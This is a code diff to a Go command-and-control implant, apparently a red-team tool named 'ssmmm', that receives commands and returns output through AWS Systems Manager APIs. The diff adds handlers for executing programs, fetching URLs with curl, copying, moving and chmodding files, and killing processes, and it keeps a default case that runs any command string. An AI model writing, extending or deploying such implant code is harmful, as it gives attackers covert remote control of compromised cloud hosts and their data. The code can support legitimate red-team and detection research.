@@ -6,13 +6,21 @@ import (
 	"fmt"
 	"os"
 	"os/exec"
+	"strconv"
 	"strings"
 
 	"github.com/grines/ssmmm/awsrsa"
 	"github.com/grines/ssmmm/awsssm"
 	"github.com/grines/ssmmm/implant/cat"
+	"github.com/grines/ssmmm/implant/implantchmod"
+	"github.com/grines/ssmmm/implant/implantcp"
+	"github.com/grines/ssmmm/implant/implantcurl"
 	"github.com/grines/ssmmm/implant/implantenv"
+	"github.com/grines/ssmmm/implant/implantexec"
+	"github.com/grines/ssmmm/implant/implantkill"
 	"github.com/grines/ssmmm/implant/implantls"
+	"github.com/grines/ssmmm/implant/implantmkdir"
+	"github.com/grines/ssmmm/implant/implantmv"
 	"github.com/grines/ssmmm/implant/implantps"
 	"github.com/grines/ssmmm/implant/implantutil"
 	"github.com/grines/ssmmm/implant/portscan"
@@ -49,6 +57,7 @@ func RunCommand(commandStr string, cmdid string, tokens awsrsa.AwsToken, managed
 		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(data), instanceRegion)
 		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
 	case "ls":
+		fmt.Println(arrCommandStr)
 		var path string
 		if len(arrCommandStr) == 1 {
 			path = "./"
@@ -63,6 +72,39 @@ func RunCommand(commandStr string, cmdid string, tokens awsrsa.AwsToken, managed
 		data := cat.Cat(arrCommandStr[1])
 		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(data), instanceRegion)
 		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
+	case "cp":
+		data, err := implantcp.Copy(arrCommandStr[1], arrCommandStr[2])
+		if err == nil {
+			awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(data), instanceRegion)
+			awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
+		}
+	case "mv":
+		var args implantmv.Arguments
+		args.SourceFile = arrCommandStr[1]
+		args.DestinationFile = arrCommandStr[2]
+		data := implantmv.Mv(args)
+		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(data), instanceRegion)
+		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
+	case "curl":
+		data := implantcurl.Curl(arrCommandStr[1])
+		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(data), instanceRegion)
+		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
+	case "chmod":
+		intVar, _ := strconv.Atoi(arrCommandStr[2])
+		data := implantchmod.Chmod(arrCommandStr[1], intVar)
+		if data == true {
+			awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode("Chmod Success"), instanceRegion)
+		} else {
+			awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode("Chmod Failed"), instanceRegion)
+		}
+		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
+	case "exec":
+		var args []string
+		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
+		args = arrCommandStr[2:]
+		data := implantexec.Exec(arrCommandStr[1], args)
+		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(data), instanceRegion)
+		//awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
 	case "cd":
 		if len(arrCommandStr) > 1 {
 			os.Chdir(arrCommandStr[1])
@@ -72,8 +114,16 @@ func RunCommand(commandStr string, cmdid string, tokens awsrsa.AwsToken, managed
 			awsssm.UpdateInstanceInformation(tokens, managedInstanceID, instanceRegion)
 		}
 		return nil
-	case "kill":
+	case "killimplant":
 		os.Exit(0)
+	case "kill":
+		data := implantkill.Kill(arrCommandStr[1])
+		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(data), instanceRegion)
+		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
+	case "mkdir":
+		data := implantmkdir.Mkdir(arrCommandStr[1])
+		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(data), instanceRegion)
+		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
 	default:
 		cmd := exec.Command(arrCommandStr[0], arrCommandStr[1:]...)
 		var out bytes.Buffer
